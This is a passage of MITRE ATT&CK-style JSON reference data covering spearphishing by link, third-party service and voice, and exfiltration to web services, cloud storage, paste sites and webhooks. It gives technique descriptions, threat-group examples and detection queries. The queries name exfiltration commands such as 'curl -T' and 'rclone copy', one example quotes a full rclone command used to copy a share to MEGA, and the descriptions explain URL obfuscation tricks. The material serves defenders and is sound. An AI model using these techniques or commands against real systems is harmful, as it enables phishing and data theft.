    "Description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveragingUser Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").[1]URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example,hxxp://google.com@1157586937.[2]Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries toSteal Application Access Tokens.[3]These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.[4]Adversaries may also utilize spearphishing links toSteal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \"consent phishing\" into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .[3][4]Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \"device code phishing,\" an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.[5][6][7]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[132][133]URL inspection within email (including expanding shortened links and identifying obfuscated URLs) can help detect links leading to known malicious sites.[2]Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.Furthermore, monitor browser logs for homographs in ASCII and in internationalized domain names abusing different character sets (e.g. Cyrillic vs Latin versions of trusted sites).Analytic 1 - Detecting Phishing Emails with Malicious Links(source=\"o365_audit\" OR source=\"gmail_logs\" OR source=\"email_gateway\")| where (spf=\"fail\" OR dkim=\"fail\" OR dmarc=\"fail\")| where (subject=\"account security alert\" OR subject=\"urgent action required\" OR subject=\"password reset\")| where (url LIKE \"%tinyurl.com%\" OR url LIKE \"%bit.ly%\" OR url LIKE \"%@%\" OR url LIKE \"%.xyz\" OR url LIKE \"%.top\")| eval risk_score=case(    spf=\"fail\" AND dkim=\"fail\", 9,    url LIKE \"%@%\", 8,    url LIKE \"%.xyz\" OR url LIKE \"%.top\", 7)| where risk_score >= 7| stats count by _time, sender, recipient, subject, url, risk_score",
      "Monitor and analyze SSL/TLS traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Furthermore, monitor network traffic for cloned sites as well as homographs via the use of internationalized domain names abusing different character sets (e.g. Cyrillic vs Latin versions of trusted sites).Analytic 1 - Detecting Clicks on Malicious Links in Phishing Emails(EventCode=3)OR (source=\"zeek_http_logs\" uri IN (malicious_url_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    domain IN (\"bit.ly\", \"tinyurl.com\"), 8,    domain IN (\".xyz\", \".top\"), 7,    uri IN (malicious_url_list), 9)| where risk_score >= 7| stats count by _time, host, user, uri, domain, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "AADInternalscan send \"consent phishing\" emails containing malicious links designed to steal users’ access tokens.[8]",
      "AppleJeushas been distributed via spearphishing link.[9]",
      "APT1has sent spearphishing emails containing hyperlinks to malicious files.[10]",
      "APT29has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.[11][12][13]",
      "APT3has sent spearphishing emails containing malicious links.[14]",
      "APT32has sent spearphishing emails containing malicious links.[15][16][17][18][19]",
      "APT33has sent spearphishing emails containing links to .hta files.[20][21]",
      "APT39leveraged spearphishing emails with malicious links to initially compromise victims.[22][23]",
      "APT42has sent spearphishing emails containing malicious links.[24][25][26]",
      "Bazarhas been spread via emails with embedded malicious links.[27][28][29]",
      "BlackTechhas used spearphishing e-mails with links to cloud services to deliver malware.[30]",
      "Bumblebeehas been spread through e-mail campaigns with malicious links.[31][32]",
      "DuringC0011,Transparent Tribesent emails containing a malicious link to student targets in India.[33]",
      "DuringC0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.[34][35]",
      "Cobalt Grouphas sent emails with URLs pointing to malicious documents.[36][37]",
      "Confuciushas sent malicious links to victims through email campaigns.[38]",
      "DarkGateis distributed in phishing emails containing links to distribute malicious VBS or MSI files.[39]DarkGateuses applications such as Microsoft Teams for distributing links to payloads.[39]",
      "Earth Luscahas sent spearphishing emails to potential targets that contained a malicious link.[40]",
      "Elderwoodhas delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.[41][42]",
      "Emotethas been delivered by phishing emails containing links.[43][44][45][46][47][48][49][49][50]",
      "Evilnumhas sent spearphishing emails containing a link to a zip file hosted on Google Drive.[51]",
      "EXOTIC LILYhas relied on victims to open malicious links in e-mails for execution.[52]",
      "FIN4has used spearphishing emails (often sent from compromised accounts) containing malicious links.[53][54]",
      "FIN7has conducted broad phishing campaigns using malicious links.[55]",
      "FIN8has distributed targeted emails containing links to malicious documents with embedded macros.[56]",
      "Grandoreirohas been spread via malicious links embedded in e-mails.[57][58]",
      "GuLoaderhas been spread in phishing campaigns using malicious web links.[59]",
      "Hancitorhas been delivered via phishing emails which contained malicious links.[60]",
      "Javalihas been delivered via malicious links embedded in e-mails.[61]",
      "Kerrdownhas been distributed via e-mails containing a malicious link.[19]",
      "Kimsukyhas sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.[62][63][64]",
      "KOCTOPUShas been distributed as a malicious link within an email.[65]",
      "Latrodectushas been distributed to victims through emails containing malicious links.[66][67]",
      "Lazarus Grouphas sent malicious links to victims via email.[68]",
      "LazyScripterhas used spam emails that contain a link that redirects the victim to download a malicious document.[65]",
      "Leviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.[69][70]",
      "LuminousMothhas sent spearphishing emails containing a malicious Dropbox download link.[71]",
      "Lumma Stealerhas been delivered through phishing emails containing malicious links.[72]",
      "Machetehas sent phishing emails that contain a link to an external server with ZIP and RAR archives.[73][74]",
      "Magic Houndhas sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to downloadPupy.[75][76][77][78]",
      "Melcozhas been spread through malicious links embedded in e-mails.[61]",
      "Mispaduhas been spread via malicious links embedded in emails.[79]",
      "Mofangdelivered spearphishing emails with malicious links included.[80]",
      "Moleratshas sent phishing emails with malicious links included.[81]",
      "MuddyWaterhas sent targeted spearphishing e-mails with malicious links.[82][83][84]",
      "Mustang Pandahas delivered malicious links to their intended targets.[85]",
      "Mustard Tempesthas sent victims emails containing links to compromised websites.[86]",
      "NETWIREhas been spread via e-mail campaigns utilizing malicious links.[59]",
      "DuringNight Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.[87]",
      "OilRighas sent spearphising emails with malicious links to potential victims.[88][89]",
      "DuringOperation Dream Job,Lazarus Groupsent malicious OneDrive links with fictitious job offer advertisements via email.[90][91]",
      "DuringOperation Dust Storm, the threat actors sent spearphishing emails containing a malicious link.[92]",
      "DuringOperation Spalax, the threat actors sent phishing emails to victims that contained a malicious link.[93]",
      "OutSteelhas been distributed through malicious links contained within spearphishing emails.[94]",
      "Patchworkhas used spearphishing with links to deliver files with exploits to initial victims.[95][96][97]",
      "Pikabot Distribution February 2024utilized emails with hyperlinks leading to malicious ZIP archive files containing scripts to download and installPikabot.[98]",
      "Ponyhas been delivered via spearphishing emails which contained malicious links.[99]",
      "QakBothas spread through emails with malicious links.[100][101][102][103][104][105][106]",
      "RedCurlhas used phishing emails with malicious links to gain initial access.[107][108]",
      "Mustang Pandadistributed malicious links in phishing emails leading to HTML files that would direct the victim to malicious MSC files if running Windows based on User Agent fingerprinting duringRedDelta Modified PlugX Infection Chain Operations.[109]",
      "Saint Bothas been distributed through malicious links contained within spearphishing emails.[94]",
      "Sandworm Teamhas crafted phishing emails containing malicious hyperlinks.[110]",
      "Sidewinderhas sent e-mails with malicious links often crafted for specific targets.[111][112]",
      "Snip3has been delivered to victims through e-mail links to malicious files.[113]",
      "SocGholishhas been spread via emails containing malicious links.[86]",
      "SpicyOmelettehas been distributed via emails containing a malicious link that appears to be a PDF document.[37]",
      "Squirrelwafflehas been distributed through phishing emails containing a malicious URL.[114]",
      "Storm-1811has distributed malicious links to victims that redirect to EvilProxy-based phishing sites to harvest credentials.[115]",
      "TA2541has used spearphishing e-mails with malicious links to deliver malware.[116][113]",
      "TA505has sent spearphishing emails containing malicious links.[117][118][119][120]",
      "TA577has sent emails containing links to malicious JavaScript files.[66]",
      "Transparent Tribehas embedded links to malicious downloads in e-mails.[121][122]",
      "TrickBothas been delivered via malicious links in phishing e-mails.[123]",
      "Turlaattempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.[124]",
      "Valakhas been delivered via malicious links in e-mail.[125]",
      "Windshifthas sent spearphishing emails with links to harvest credentials and deliver malware.[126]",
      "Wizard Spiderhas sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.[127][128]",
      "ZIRCONIUMhas used malicious links in e-mails to deliver malware.[129][130][131]"
    ]
  },
  "T1566.003": {
    "Name": "Phishing:Spearphishing via Service",
    "Description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.[1]These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may send spearphishing messages via third-party services in an attempt to gain access to victim systems.Analytic 1 - Detecting Malicious Downloads from Personal Email or Social Media(EventCode=1 OR EventCode=4688)OR (source=\"/var/log/audit/audit.log\" type=\"open\")| where (process_path=\"C:\\Users\\\\Downloads\\\" OR process_path=\"/home//Downloads/\")| where (parent_process IN (\"chrome.exe\", \"firefox.exe\", \"edge.exe\", \"safari.exe\")         AND url IN (\"mail.google.com\", \"outlook.live.com\", \"linkedin.com\", \"telegram.org\", \"discord.com\", \"dropbox.com\"))| eval risk_score=case(    like(file_name, \"%.exe\"), 8,    like(file_name, \"%.js\"), 9,    like(file_name, \"%.vbs\"), 7)| where risk_score >= 7| stats count by _time, host, user, file_name, process_path, parent_process, risk_score",
      "Monitor for outbound connections to personal email, social media, or file-sharing platforms, shortened URLs or redirect chains in chat messages, links leading to newly registered or uncommon domains, or encrypted traffic indicating potential TLS phishing interactions.Analytic 1 - Detecting Spearphishing Links from Third-Party Services(EventCode=3)OR (source=\"zeek_http_logs\" uri IN (malicious_url_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    domain IN (\"bit.ly\", \"tinyurl.com\"), 8,    domain IN (\".xyz\", \".top\"), 7,    uri IN (malicious_url_list), 9)| where risk_score >= 7| stats count by _time, host, user, uri, domain, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Ajax Security Teamhas used various social media channels to spearphish victims.[2]",
      "APT29has used the legitimate mailing service Constant Contact to send phishing e-mails.[3]",
      "CURIUMhas used social media to deliver malicious files to victims.[4]",
      "Dark Caracalspearphished victims via Facebook and Whatsapp.[1]",
      "EXOTIC LILYhas used the e-mail notification features of legitimate file sharing services for spearphishing.[5]",
      "FIN6has used fake job advertisements sent via LinkedIn to spearphish targets.[6]",
      "Lazarus Grouphas used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.[7]",
      "Magic Houndused various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.[8][9][10]",
      "Moonstone Sleethas used social media services to spear phish victims to deliver trojainized software.[11]",
      "Ninjahas been distributed to victims via the messaging app Telegram.[12]",
      "OilRighas used LinkedIn to send spearphishing links.[13]",
      "DuringOperation Dream Job,Lazarus Groupsent victims spearphishing messages via LinkedIn concerning fictitious jobs.[14][15]",
      "Storm-1811has used Microsoft Teams to send messages and initiate voice calls to victims posing as IT support personnel.[16]",
      "ToddyCathas sent loaders configured to runNinjaas zip archives via Telegram.[12]",
      "Windshifthas used fake personas on social media to engage and target victims.[17]"
    ]
  },
  "T1566.004": {
    "Name": "Phishing:Spearphishing Voice",
    "Description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex:Impersonation) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying onUser Executionfor delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[1][2]or install adversary-accessible remote management tools (Remote Access Tools) onto their computer.[3]Adversaries may also combine voice phishing withMulti-Factor Authentication Request Generationin order to trick users into divulging MFA credentials or accepting authentication prompts.[4]",
    "Detects": [
      "Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers. Correlate these records with system events."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderimpersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.[5]",
      "Storm-1811has initiated voice calls with victims posing as IT support to prompt users to download and execute scripts and other tools for initial access.[6][7][8]"
    ]
  },
  "T1567": {
    "Name": "Exfiltration Over Web Service",
    "Description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "Detects": [
      "Review logs for SaaS services, including Office 365 and Google Workspace, to detect the configuration of new webhooks or other features that could be abused to exfiltrate data.Analytic 1 - Detecting Large File Uploads to Web Services(EventCode=\"FileUploaded\" OR EventCode=\"PutObject\" OR source=\"O365_audit\" OR source=\"Google_Admin_Logs\")| where (file_size > 5000000)  // Detects files larger than 5MB| stats count by _time, host, user, action, service_name, file_size| where count >= 3| eval risk_score=case(    file_size > 50000000, 9,  // High-risk large file transfer    file_size > 5000000, 8)| where risk_score >= 8| table _time, host, user, action, service_name, file_size, risk_score",
      "Monitor for execution of cloud storage CLI tools (e.g., AWS CLI, rclone, gdrive, azcopy, gsutil), scripts automating file transfers to cloud services, or use of PowerShell or Bash to upload files to external web services.Analytic 1 - Detecting Web Service File Upload via CLI Tools(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"rclone copy\", \"aws s3 cp\", \"gsutil cp\", \"azcopy copy\", \"curl -T\", \"wget --post-file\"))| eval risk_score=case(    command IN (\"rclone copy\", \"aws s3 cp\"), 9,    command IN (\"curl -T\", \"wget --post-file\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for files being accessed by an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.Analytic 1 - Detecting File Staging Before Web Service Upload(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path LIKE \"/tmp/%\", 9,    file_path LIKE \"C:\\Users\\\\Documents\\exfil\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for newly constructed network connections to web and cloud services associated with abnormal or non-browser processes.Analytic 1 - Detecting Large Data Transfers to Web Services(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_ip IN (known_cloud_services) AND bytes_out > 5000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip| where total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, risk_score",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "AppleSeedhas exfiltrated files using web services.[1]",
      "APT28can exfiltrate data over Google Drive.[2]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28exfiltrated data over public-facing webservers – such as Google Drive.[3]",
      "BlackBytehas used services such asanonymfiles.comandfile.ioto exfiltrate victim data.[4]",
      "DuringC0017,APT41used Cloudflare services for data exfiltration.[5]",
      "DropBookhas used legitimate web services to exfiltrate data.[6]",
      "Exbyteexfiltrates collected data to online file hosting sites such asMega.co.nz.[7][8]",
      "Magic Houndhas used the Telegram APIsendMessageto relay data on compromised devices.[9]",
      "ngrokhas been used by threat actors to configure servers for data exfiltration.[10]",
      "OilCheckcan upload documents from compromised hosts to a shared Microsoft Office 365 Outlook email account for exfiltration.[11]",
      "SampleCheck5000can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve files for exfiltration.[12][11]"
    ]
  },
  "T1567.001": {
    "Name": "Exfiltration Over Web Service:Exfiltration to Code Repository",
    "Description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
    "Detects": [
      "Monitor for execution of commands for repository interaction (git push, curl, gh repo create, git clone), use of API clients (e.g., curl -X POST https://api.github.com/repos/user/repo/contents/), or unusual usage of PowerShell or Bash scripts to automate repository uploads.Analytic 1 - Detecting Repository Uploads via Command Execution(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"git push\", \"gh repo create\", \"curl -X POST\", \"git clone\", \"git add\", \"git commit\"))| eval risk_score=case(    command IN (\"git push\", \"gh repo create\"), 9,    command IN (\"curl -X POST\", \"git commit\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for files being accessed to exfiltrate data to a code repository rather than over their primary command and control channel.Analytic 1 - Detecting File Staging for Exfiltration to Code Repositories(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/home//repos/\", \"C:\\Users\\\\Documents\\git_repos\\\", \"/var/tmp/repos/\"))| eval risk_score=case(    file_path LIKE \"/home//repos/%\", 9,    file_path LIKE \"C:\\Users\\\\Documents\\git_repos\\%\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for outbound network connections to code repository services (e.g., github.com, gitlab.com), web API calls to repository endpoints (POST https://api.github.com/repos/...), or SSH traffic to Git services (git@github.com:username/repo.git).Analytic 1 - Detecting Outbound Connections to Code Repositories(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_ip IN (known_code_repos) AND bytes_out > 5000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip| where total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Monitor for use of code repositories for data exfiltration."
    ],
    "Procedure Examples": [
      "Empirecan use GitHub for data exfiltration.[1]"
    ]
  },
  "T1567.002": {
    "Name": "Exfiltration Over Web Service:Exfiltration to Cloud Storage",
    "Description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
    "Detects": [
      "Monitor for execution of cloud storage CLI tools (rclone, gdrive, aws s3 cp, azcopy, gsutil), use of PowerShell, Bash, or Python scripts to upload files to cloud storage, or attempts to obfuscate file uploads via scripting (e.g., Base64 encoding before upload).Analytic 1 - Detecting File Upload to Cloud Storage via CLI Tools(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"rclone copy\", \"aws s3 cp\", \"gsutil cp\", \"azcopy copy\", \"curl -T\", \"wget --post-file\"))| eval risk_score=case(    command IN (\"rclone copy\", \"aws s3 cp\"), 9,    command IN (\"curl -T\", \"wget --post-file\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for files being accessed to exfiltrate data to a cloud storage service rather than over their primary command and control channel.Analytic 1 - Detecting File Staging Before Cloud Storage Upload(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path LIKE \"/tmp/%\", 9,    file_path LIKE \"C:\\Users\\\\Documents\\exfil\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for unusual outbound connections to cloud storage domains, processes sending significantly more data than they receive, or high-bandwidth file transfers to cloud services.Analytic 1 - Detecting Large Data Transfers to Cloud Storage(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_ip IN (known_cloud_services) AND bytes_out > 5000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip| where total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, risk_score",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Monitor for cloud storages for data exfiltration."
    ],
    "Procedure Examples": [
      "Akirawill exfiltrate victim data using applications such asRclone.[1]",
      "APT41 DUSTexfiltrated collected information to OneDrive.[2]",
      "BoomBoxcan upload data to dedicated per-victim folders in Dropbox.[3]",
      "BoxCaonhas the capability to download folders' contents on the system and upload the results back to its Dropbox drive.[4]",
      "DuringC0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using theRclonecommandrclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.[5]",
      "Chimerahas exfiltrated stolen data to OneDrive accounts.[6]",
      "Cinnamon Tempesthas uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.[7]",
      "Clamblingcan send files from a victim's machine to Dropbox.[8][9]",
      "Confuciushas exfiltrated victim data to cloud storage service accounts.[10]",
      "CreepyDrivecan use cloud services including OneDrive for data exfiltration.[11]",
      "Crutchhas exfiltrated stolen data to Dropbox.[12]",
      "Earth Luscahas used the megacmd tool to upload stolen files from a victim network to MEGA.[13]",
      "Ember Bearhas used tools such asRcloneto exfiltrate information from victim environments to cloud storage such asmega.nz.[14]",
      "Empirecan use Dropbox for data exfiltration.[15]",
      "FIN7has exfiltrated stolen data to the MEGA file sharing site.[16]",
      "HAFNIUMhas exfiltrated data to file sharing sites, including MEGA.[17]",
      "HAMMERTOSSexfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.[18]",
      "HEXANEhas used cloud services, including OneDrive, for data exfiltration.[11]",
      "Indrik Spiderhas exfiltrated data usingRcloneor MEGASync prior to deploying ransomware.[19]",
      "Kimsukyhas exfiltrated stolen files and data to actor-controlled Blogspot accounts.[20]",
      "Leviathanhas used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.[21][22]",
      "LuminousMothhas exfiltrated data to Google Drive.[23]",
      "Octopushas exfiltrated data to file sharing sites.[24]",
      "ODAgentcan use an attacker-controlled OneDrive account for exfiltration.[25]",
      "OilBoostercan exfiltrate files to an actor-controlled OneDrive account via the Microsoft Graph API.[25]",
      "DuringOperation Dream Job,Lazarus Groupused a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[26][27]",
      "Pcextercan upload stolen files to OneDrive storage accounts via HTTPPOST.[28]",
      "POLONIUMhas exfiltrated stolen data toPOLONIUM-owned OneDrive and Dropbox accounts.[11]",
      "RainyDaycan use a file exfiltration tool to upload specific files to Dropbox.[29]",
      "Rclonecan exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.[30][5]",
      "ROKRATcan send collected data to cloud storage services such as PCloud.[31][32]",
      "Scattered Spiderhas exfiltrated victim data to the MEGA file sharing site.[33][34]",
      "Threat Group-3390has exfiltrated stolen data to Dropbox.[8]",
      "ToddyCathas used a DropBox uploader to exfiltrate stolen files.[28]",
      "Turlahas used WebDAV to upload stolen USB files to a cloud drive.[35]Turlahas also exfiltrated stolen files to OneDrive and 4shared.[36]",
      "Wizard Spiderhas exfiltrated stolen victim data to various cloud storage providers.[37]",
      "ZIRCONIUMhas exfiltrated stolen data to Dropbox.[38]"
    ]
  },
  "T1567.003": {
    "Name": "Exfiltration Over Web Service:Exfiltration to Text Storage Sites",
    "Description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such aspastebin[.]com, are commonly used by developers to share code and other information.Text storage sites are often used to host malicious code for C2 communication (e.g.,Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.[1]Note:This is distinct fromExfiltration to Code Repository, which highlight access to code repositories via APIs.",
    "Detects": [
      "Monitor and analyze network traffic for exfiltration attempts using text storage sites, i.e. POST requests to text storage sites, Base64 or other obfuscated data within outbound web requests, or unusual user-agent strings indicating API-based exfiltration.'Analytic 1 - Detecting Large Data Transfers to Pastebin or Similar Services(EventCode=3 OR source=\"zeek_http.log\" OR source=\"firewall_logs\")| where (dest_domain LIKE \".pastebin.com\" OR dest_domain LIKE \".hastebin.com\" OR dest_domain LIKE \".rentry.co\" OR dest_domain LIKE \".ghostbin.com\")| where (http_method=\"POST\")| stats count, sum(bytes_out) as total_bytes by _time, host, user, dest_domain, user_agent| where total_bytes > 500000| eval risk_score=case(    total_bytes > 10000000, 9,    total_bytes > 500000, 8)| where risk_score >= 8| table host, user, dest_domain, total_bytes, user_agent, risk_score",
      "Monitor network data for uncommon data flows, specifically to text storage sites such asPastebin[.]com,Paste[.]ee, andPastebin[.]pl."
    ],
    "Procedure Examples": [
      "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."
    ]
  },
  "T1567.004": {
    "Name": "Exfiltration Over Web Service:Exfiltration Over Webhook",
    "Description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.[1]Many public and commercial services, such as Discord, Slack, andwebhook.site, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.[2]When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeatedAutomated Exfiltrationof emails, chat messages, and other data.[3]Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.[4]Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.[5][6][7]",
    "Detects": [
